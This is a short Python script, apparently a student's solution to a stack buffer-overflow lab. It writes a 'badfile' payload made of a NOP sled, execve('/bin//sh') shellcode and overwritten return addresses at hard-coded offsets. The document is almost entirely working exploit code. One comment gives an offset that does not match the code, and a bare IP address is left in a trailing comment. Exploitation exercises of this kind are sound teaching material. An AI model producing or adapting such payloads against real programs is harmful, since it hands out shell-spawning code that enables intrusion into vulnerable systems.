import sys 
 
shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(1270)) 
# Put the shellcode at the end 
start = 1270 - len(shellcode) 
content[start:] = shellcode 
 
# Put the address at offset 112 
ret = 0xffffcf08 + 250 
ret2 = 0xDEADBEEF
content[651:655] = (ret).to_bytes(4,byteorder='little') 
content[524:528] = (ret2).to_bytes(4,byteorder='little') 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

#172.166.200.167

